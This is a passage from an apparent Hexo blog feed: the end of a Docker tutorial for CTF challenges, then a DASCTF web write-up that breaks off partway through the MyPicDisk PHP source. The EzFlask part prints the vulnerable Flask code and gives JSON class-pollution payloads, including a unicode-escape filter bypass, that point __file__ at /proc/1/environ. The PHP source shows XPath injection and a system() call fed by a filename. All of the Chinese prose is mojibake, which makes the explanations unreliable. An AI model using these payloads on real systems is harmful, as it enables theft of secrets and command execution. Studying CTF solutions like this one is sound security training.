¹æ®ä¸Šè¿°ä»‹ç»ï¼Œå°†è‡ªå·±æ‰€éœ€è¦æ‰§è¡Œçš„æ“ä½œå†™å…¥dockerfileï¼Œä¸æ”¾å¿ƒçš„è¯å¯ä»¥è‡ªå·±æœ¬åœ°æµ‹è¯•ä¸€ä¸‹</span><br></pre></td></tr></table></figure><p><strong>å¯åŠ¨</strong></p><p>å®Œæˆä¸Šè¿°æ“ä½œåå°±å¯ä»¥å¯åŠ¨å®¹å™¨å•¦ï¼Œæ–¹æ³•æœ‰2ï¼š</p><p>ï¼ˆ1ï¼‰ï¼šå¦‚æœåªæœ‰ä¸€ä¸ªå®¹å™¨ï¼Œå¯ä»¥ç›´æ¥åœ¨ä½ çš„dockerfileç›®å½•ä½¿ç”¨docker buildå‘½ä»¤è¿›è¡Œåˆ›å»º</p><p>ï¼ˆ2ï¼‰ï¼šå¦‚æœæœ‰å¤šä¸ªå®¹å™¨éœ€è¦ç”¨åˆ°composeï¼Œé‚£ä¹ˆå¯ä»¥åœ¨.yamlç›®å½•ä¸­æ‰§è¡Œdocker-compose up -d</p>]]></content>
    
    
    <summary type="html">è‡´åŠ›äºå¸®åŠ©æ–°æ‰‹å’Œå°ç™½æ»´dockeræ•™ç¨‹</summary>
    
    
    
    <category term="CTF" scheme="https://bowuchuling.github.io/categories/CTF/"/>
    
    <category term="å‡ºé¢˜æ•™ç¨‹" scheme="https://bowuchuling.github.io/categories/CTF/%E5%87%BA%E9%A2%98%E6%95%99%E7%A8%8B/"/>
    
    
    <category term="CTF" scheme="https://bowuchuling.github.io/tags/CTF/"/>
    
    <category term="æ•™ç¨‹" scheme="https://bowuchuling.github.io/tags/%E6%95%99%E7%A8%8B/"/>
    
  </entry>
  
  <entry>
    <title>DASCTF WEB WP</title>
    <link href="https://bowuchuling.github.io/posts/54ff006d.html"/>
    <id>https://bowuchuling.github.io/posts/54ff006d.html</id>
    <published>2023-07-25T10:52:33.026Z</published>
    <updated>2023-08-13T12:07:31.499Z</updated>
    
    <content type="html"><![CDATA[<h2 id="EzFlask"><a href="#EzFlask" class="headerlink" title="EzFlask"></a>EzFlask</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, session</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> black_list</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.secret_key = <span class="built_in">str</span>(uuid.uuid4())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check</span>(<span class="params">data</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> black_list:</span><br><span class="line">        <span class="keyword">if</span> i <span class="keyword">in</span> data:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">merge</span>(<span class="params">src, dst</span>):</span><br><span class="line">    <span class="keyword">for</span> k, v <span class="keyword">in</span> src.items():</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">hasattr</span>(dst, <span class="string">&#x27;__getitem__&#x27;</span>):</span><br><span class="line">            <span class="keyword">if</span> dst.get(k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">                merge(v, dst.get(k))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                dst[k] = v</span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">hasattr</span>(dst, k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">            merge(v, <span class="built_in">getattr</span>(dst, k))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">setattr</span>(dst, k, v)</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">user</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        self.username = <span class="string">&quot;&quot;</span></span><br><span class="line">        self.password = <span class="string">&quot;&quot;</span></span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">check</span>(<span class="params">self, data</span>):</span><br><span class="line">        <span class="keyword">if</span> self.username == data[<span class="string">&#x27;username&#x27;</span>] <span class="keyword">and</span> self.password == data[<span class="string">&#x27;password&#x27;</span>]:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">Users = []</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/register&#x27;</span>,methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">register</span>():</span><br><span class="line">    <span class="keyword">if</span> request.data:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> check(request.data):</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;Register Failed&quot;</span></span><br><span class="line">            data = json.loads(request.data)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;username&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> data <span class="keyword">or</span> <span class="string">&quot;password&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> data:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;Register Failed&quot;</span></span><br><span class="line">            User = user()</span><br><span class="line">            merge(data, User)</span><br><span class="line">            Users.append(User)</span><br><span class="line">        <span class="keyword">except</span> Exception:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Register Failed&quot;</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Register Success&quot;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Register Failed&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/login&#x27;</span>,methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login</span>():</span><br><span class="line">    <span class="keyword">if</span> request.data:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            data = json.loads(request.data)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;username&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> data <span class="keyword">or</span> <span class="string">&quot;password&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> data:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;Login Failed&quot;</span></span><br><span class="line">            <span class="keyword">for</span> user <span class="keyword">in</span> Users:</span><br><span class="line">                <span class="keyword">if</span> user.check(data):</span><br><span class="line">                    session[<span class="string">&quot;username&quot;</span>] = data[<span class="string">&quot;username&quot;</span>]</span><br><span class="line">                    <span class="keyword">return</span> <span class="string">&quot;Login Success&quot;</span></span><br><span class="line">        <span class="keyword">except</span> Exception:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Login Failed&quot;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;Login Failed&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>,methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">open</span>(__file__, <span class="string">&quot;r&quot;</span>).read()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(host=<span class="string">&quot;0.0.0.0&quot;</span>, port=<span class="number">5010</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>å®¡è®¡æºç ï¼Œå­˜åœ¨æ ‡å¿—æ€§å‡½æ•°mergeï¼Œä¸ºpythonç±»åŸå‹é“¾æ±¡æŸ“ï¼Œç»§ç»­å®¡è®¡å‘ç°å¯åˆ©ç”¨å‡½æ•°open(â€˜â€™,â€™â€™).read()ï¼Œæ„é€ jsonä»£ç ï¼Œä¿®æ”¹<strong>FILE</strong>çš„æ•°å€¼ä¸ºæƒ³è¦è¯»å–çš„å†…å®¹ï¼Œè¿™é‡Œè¯»å–ç¯å¢ƒå˜é‡</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&quot;username&quot;</span>:<span class="string">&quot;123&quot;</span>,<span class="string">&quot;password&quot;</span>:<span class="string">&quot;123&quot;</span>,<span class="string">&quot;__init__&quot;</span>:&#123;<span class="string">&quot;__globals__&quot;</span>: &#123;<span class="string">&quot;__file__&quot;</span>:<span class="string">&quot;/proc/1/environ&quot;</span>&#125;&#125;&#125;</span><br><span class="line"><span class="regexp">//</span>å‰é¢çš„usernameå’Œpasswordæ˜¯ä¸ºäº†ç»•è¿‡ä»£ç æ£€æŸ¥</span><br></pre></td></tr></table></figure><p>æäº¤åç»æ£€æŸ¥å‘ç°å­—ç¬¦ä¸²<strong>init</strong>è¢«è¿‡æ»¤</p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">è¿™é‡Œå¯ä»¥ä½¿ç”¨unicodeç¼–ç è¿›è¡Œç»•è¿‡</span><br><span class="line"><span class="symbol">\u0000</span><span class="symbol">\u005f</span><span class="symbol">\u0000</span><span class="symbol">\u005f</span><span class="symbol">\u0000</span><span class="symbol">\u0069</span><span class="symbol">\u0000</span><span class="symbol">\u006e</span><span class="symbol">\u0000</span><span class="symbol">\u0069</span><span class="symbol">\u0000</span><span class="symbol">\u0074</span><span class="symbol">\u0000</span><span class="symbol">\u005f</span><span class="symbol">\u0000</span><span class="symbol">\u005f</span></span><br><span class="line">&#123;&quot;username&quot;:&quot;123&quot;,&quot;password&quot;:&quot;123&quot;,&quot;<span class="symbol">\u0000</span><span class="symbol">\u005f</span><span class="symbol">\u0000</span><span class="symbol">\u005f</span><span class="symbol">\u0000</span><span class="symbol">\u0069</span><span class="symbol">\u0000</span><span class="symbol">\u006e</span><span class="symbol">\u0000</span><span class="symbol">\u0069</span><span class="symbol">\u0000</span><span class="symbol">\u0074</span><span class="symbol">\u0000</span><span class="symbol">\u005f</span><span class="symbol">\u0000</span><span class="symbol">\u005f</span>&quot;:&#123;&quot;__globals__&quot;: &#123;&quot;__file__&quot;:&quot;/proc/1/environ&quot;&#125;&#125;&#125;</span><br><span class="line">æˆ–è€…ä½¿ç”¨userç±»çš„checkå‡½æ•°è¿›è¡Œå®ä¾‹åŒ–ç»•è¿‡</span><br><span class="line">&#123;&quot;username&quot;:&quot;123&quot;,&quot;password&quot;:&quot;123&quot;,&quot;check&quot;:&#123;&quot;__globals__&quot;: &#123;&quot;__file__&quot;:&quot;/proc/1/environ&quot;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure><p>å¾—åˆ°flag</p><h2 id="MyPicDisk"><a href="#MyPicDisk" class="headerlink" title="MyPicDisk"></a>MyPicDisk</h2><figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br></pre></td><td class="code"><pre><span class="line"><span class="language-php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="language-php"><span class="title function_ invoke__">session_start</span>();</span></span><br><span class="line"><span class="language-php"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span></span><br><span class="line"><span class="language-php"><span class="class"><span class="keyword">class</span> <span class="title">FILE</span></span>&#123;</span></span><br><span class="line"><span class="language-php">    <span class="keyword">public</span> <span class="variable">$filename</span>;</span></span><br><span class="line"><span class="language-php">    <span class="keyword">public</span> <span class="variable">$lasttime</span>;</span></span><br><span class="line"><span class="language-php">    <span class="keyword">public</span> <span class="variable">$size</span>;</span></span><br><span class="line"><span class="language-php">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$filename</span></span>)</span>&#123;</span></span><br><span class="line"><span class="language-php">        <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\//i&quot;</span>, <span class="variable">$filename</span>))&#123;</span></span><br><span class="line"><span class="language-php">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&quot;hacker!&quot;</span>);</span></span><br><span class="line"><span class="language-php">        &#125;</span></span><br><span class="line"><span class="language-php">        <span class="variable">$num</span> = <span class="title function_ invoke__">substr_count</span>(<span class="variable">$filename</span>, <span class="string">&quot;.&quot;</span>);</span></span><br><span class="line"><span class="language-php">        <span class="keyword">if</span> (<span class="variable">$num</span> != <span class="number">1</span>)&#123;</span></span><br><span class="line"><span class="language-php">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&quot;hacker!&quot;</span>);</span></span><br><span class="line"><span class="language-php">        &#125;</span></span><br><span class="line"><span class="language-php">        <span class="keyword">if</span> (!<span class="title function_ invoke__">is_file</span>(<span class="variable">$filename</span>))&#123;</span></span><br><span class="line"><span class="language-php">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&quot;???&quot;</span>);</span></span><br><span class="line"><span class="language-php">        &#125;</span></span><br><span class="line"><span class="language-php">        <span class="variable language_">$this</span>-&gt;filename = <span class="variable">$filename</span>;</span></span><br><span class="line"><span class="language-php">        <span class="variable language_">$this</span>-&gt;size = <span class="title function_ invoke__">filesize</span>(<span class="variable">$filename</span>);</span></span><br><span class="line"><span class="language-php">        <span class="variable language_">$this</span>-&gt;lasttime = <span class="title function_ invoke__">filemtime</span>(<span class="variable">$filename</span>);</span></span><br><span class="line"><span class="language-php">    &#125;</span></span><br><span class="line"><span class="language-php">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">remove</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="language-php">        <span class="title function_ invoke__">unlink</span>(<span class="variable">$this</span>-&gt;filename);</span></span><br><span class="line"><span class="language-php">    &#125;</span></span><br><span class="line"><span class="language-php">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">show</span>(<span class="params"></span>)</span></span></span><br><span class="line"><span class="function"><span class="language-php">    </span>&#123;</span></span><br><span class="line"><span class="language-php">        <span class="keyword">echo</span> <span class="string">&quot;Filename: &quot;</span>. <span class="variable language_">$this</span>-&gt;filename. <span class="string">&quot;  Last Modified Time: &quot;</span>.<span class="variable language_">$this</span>-&gt;lasttime. <span class="string">&quot;  Filesize: &quot;</span>.<span class="variable language_">$this</span>-&gt;size.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span></span><br><span class="line"><span class="language-php">    &#125;</span></span><br><span class="line"><span class="language-php">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="language-php">        <span class="title function_ invoke__">system</span>(<span class="string">&quot;ls -all &quot;</span>.<span class="variable">$this</span>-&gt;filename);</span></span><br><span class="line"><span class="language-php">    &#125;</span></span><br><span class="line"><span class="language-php">&#125;</span></span><br><span class="line"><span class="language-php"><span class="meta">?&gt;</span></span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">  <span class="tag">&lt;<span class="name">title</span>&gt;</span>MyPicDisk<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"></span><span class="language-php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="language-php"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;user&#x27;</span>]))&#123;</span></span><br><span class="line"><span class="language-php">  <span class="keyword">echo</span> <span class="string">&#x27;</span></span></span><br><span class="line"><span class="string"><span class="language-php">&lt;form method=&quot;POST&quot;&gt;</span></span></span><br><span class="line"><span class="string"><span class="language-php">    usernameï¼š&lt;input type=&quot;text&quot; name=&quot;username&quot;&gt;&lt;/p&gt;</span></span></span><br><span class="line"><span class="string"><span class="language-php">    passwordï¼š&lt;input type=&quot;password&quot; name=&quot;password&quot;&gt;&lt;/p&gt;</span></span></span><br><span class="line"><span class="string"><span class="language-php">    &lt;input type=&quot;submit&quot; value=&quot;ç™»å½•&quot; name=&quot;submit&quot;&gt;&lt;/p&gt;</span></span></span><br><span class="line"><span class="string"><span class="language-php">&lt;/form&gt;</span></span></span><br><span class="line"><span class="string"><span class="language-php">&#x27;</span>;</span></span><br><span class="line"><span class="language-php">  <span class="variable">$xml</span> = <span class="title function_ invoke__">simplexml_load_file</span>(<span class="string">&#x27;/tmp/secret.xml&#x27;</span>);</span></span><br><span class="line"><span class="language-php">  <span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])&#123;</span></span><br><span class="line"><span class="language-php">    <span class="variable">$username</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>];</span></span><br><span class="line"><span class="language-php">    <span class="variable">$password</span>=<span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]);</span></span><br><span class="line"><span class="language-php">    <span class="variable">$x_query</span>=<span class="string">&quot;/accounts/user[username=&#x27;<span class="subst">&#123;$username&#125;</span>&#x27; and password=&#x27;<span class="subst">&#123;$password&#125;</span>&#x27;]&quot;</span>;</span></span><br><span class="line"><span class="language-php">    <span class="variable">$result</span> = <span class="variable">$xml</span>-&gt;<span class="title function_ invoke__">xpath</span>(<span class="variable">$x_query</span>);</span></span><br><span class="line"><span class="language-php">    <span class="keyword">if</span>(<span class="title function_ invoke__">count</span>(<span class="variable">$result</span>)==<span class="number">0</span>)&#123;</span></span><br><span class="line"><span class="language-php">      <span class="keyword">echo</span> <span class="string">&#x27;ç™»å½•å¤±è´¥&#x27;</span>;</span></span><br><span class="line"><span class="language-php">    &#125;<span class="keyword">else</span>&#123;</span></span><br><span class="line"><span class="language-php">      <span class="variable">$_SESSION</span>[<span class="string">&#x27;user&#x27;</span>] = <span class="variable">$username</span>;</span></span><br><span class="line"><span class="language-php">        <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;ç™»å½•æˆåŠŸ!&#x27;);location.href=&#x27;/index.php&#x27;;&lt;/script&gt;&quot;</span>;</span></span><br><span class="line"><span class="language-php">    &#125;</span></span><br><span class="line"><span class="language-php">  &#125;</span></span><br><span class="line"><span class="language-php">&#125;</span></span><br><span class="line"><span class="language-php"><span class="keyword">else</span>&#123;</span></span><br><span class="line"><span class="language-php">    <span class="keyword">if</span> (<span class="variable">$_SESSION</span>[<span class="string">&#x27;user&#x27;</span>] !== <span class="string">&#x27;admin&#x27;</span>) &#123;</span></span><br><span class="line"><span class="language-php">        <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;you are not admin!!!!!&#x27;);&lt;/script&gt;&quot;</span>;</span></span><br><span class="line"><span class="language-php">        <span class="keyword">unset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;user&#x27;</span>]);</span></span><br><span class="line"><span class="language-php">        <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;location.href=&#x27;/index.php&#x27;;&lt;/script&gt;&quot;</span>;</span></span><br><span class="line"><span class="language-php">    &#125;</span></span><br><span class="line"><span class="language-php">  <span class="keyword">echo</span> <span class="string">&quot;&lt;!-- /y0u_cant_find_1t.zip --&gt;&quot;</span>;</span></span><br><span class="line"><span class="language-php">  <span class="keyword">if</span> (!<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]) &#123;</span></span><br><span class="line"><span class="language-php">    <span class="keyword">foreach</span> (<span class="title function_ invoke__">scandir</span>(<span class="string">&quot;.&quot;</span>) <span class="keyword">as</span> <span class="variable">$filename</span>) &#123;</span></span><br><span class="line"><span class="language-php">      <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/.(jpg|jpeg|gif|png|bmp)$/i&quot;</span>, <span class="variable">$filename</span>)) &#123;</span></span><br><span class="line"><span class="language-php">        <span class="keyword">echo</span> <span class="string">&quot;&lt;a href=&#x27;index.php/?file=&quot;</span> . <span class="variable">$filename</span> . <span class="string">&quot;&#x27;&gt;&quot;</span> . <span class="variable">$filename</span> . <span class="string">&quot;&lt;/a&gt;&lt;br&gt;&quot;</span>;</span></span><br><span class="line"><span class="language-php">      &#125;</span></span><br><span class="line"><span class="language-php">    &#125;</span></span><br><span class="line"><span class="language-php">    <span class="keyword">echo</span> <span class="string">&#x27;</span></span></span><br><span class="line"><span class="string"><span class="language-php">  &lt;form action=&quot;index.php&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;</span></span></span><br><span class="line"><span class="string"><span class="language-php">  é€‰æ‹©å›¾ç‰‡ï¼š&lt;input type=&quot;file&quot; name=&quot;file&quot; id=&quot;&quot;&gt;</span></span></span><br><span class="line"><span class="string"><span class="language-php">  &lt;input type=&quot;submit&quot; value=&quot;ä¸Šä¼ &quot;&gt;&lt;/form&gt;</span></span></span><br><span class="line"><span class="string"><span class="language-php">  &#x27;</span>;</span></span><br><span class="line"><span class="language-php">    <span class="keyword">if</span> (<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>]) &#123;</span></span><br><span class="line"><span class="language-php">      <span class="variable">$filename</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];</span></span><br><span class="line"><span class="language-php">      <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/.(jpg|jpeg|gif|png|bmp)$/i&quot;</span>, <span class="variable">$filename</span>)) &#123;</span></span><br><span class="line"><span class="language-php">        <span class="keyword">die</span>(<span class="string">&quot;hacker!&quot;</span>);</span></span><br><span class="line"><span class="language-php">      &#125;</span></span><br><span class="line"><span class="language-php">      <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>], <span class="variable">$filename</span>)) &#123;</span></span><br><span class="line"><span class="language-php">          <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;å›¾ç‰‡ä¸Šä¼ æˆåŠŸ!&#x27;);location.href=&#x27;/index.php&#x27;;&lt;/script&gt;&quot;</span>;</span></span><br><span class="line"><span class="language-php">      &#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="language-php">        <span class="keyword">die</span>(<span class="string">&#x27;failed&#x27;</span>);</span></span><br><span class="line"><span class="language-php">      &#125;</span></span><br><span class="line"><span class="language-php">    &#125;</span></span><br><span class="line"><span class="language-php">  &#125;</span></span><br><span class="line"><span class="language-php">  <span class="keyword">else</span>&#123;</span></span><br><span class="line"><span class="language-php">      <span class="variable">$filename</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span></span><br><span class="line"><span class="language-php">      <span class="keyword">if</span> (<span class="variable">$_GET</span>[<span class="string">&#x27;todo&#x27;</span>] === <span class="string">&quot;md5&quot;</span>)&#123;</span></span><br><span class="line"><span class="language-php">          <span class="keyword">echo</span> <span class="title function_ invoke__">md5_file</span>(<span class="variable">$filename</span>);</span></span><br><span class="line"><span class="language-php">      &#125;</span></span><br><span class="line"><span class="language-php">      <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="language-php">          <span class="variable">$file</span> = <span class="keyword">new</span> <span class="title function_ invoke__">FILE</span>(<span class="variable">$filename</span>);</span></span><br><span class="line"><span class="language-php">          <span class="keyword">if</span> (<span class="variable">$_GET</span>[<span class="string">&#x27;todo&#x27;</span>] !== <span class="string">&quot;remove&quot;</span> &amp;&amp; <span class="variable">$_GET</span>[<span class="string">&#x27;todo&#x27;</span>] !== <span class="string">&quot;show&quot;</span>) &#123;</span></span><br><span class="line"><span class="language-php">              <span class="keyword">echo</span> <span class="string">&quot;&lt;img src=&#x27;../&quot;</span> . <span class="variable">$filename</span> . <span class="string">&quot;&#x27;&gt;&lt;br&gt;&quot;</span>;</span></span><br><span class="line"><span class="language-php">              <span class="keyword">echo</span> <span class="string">&quot;&lt;a href=&#x27;../index.php/?file=&quot;</span> . <span class="variable">$filename</span> . <span 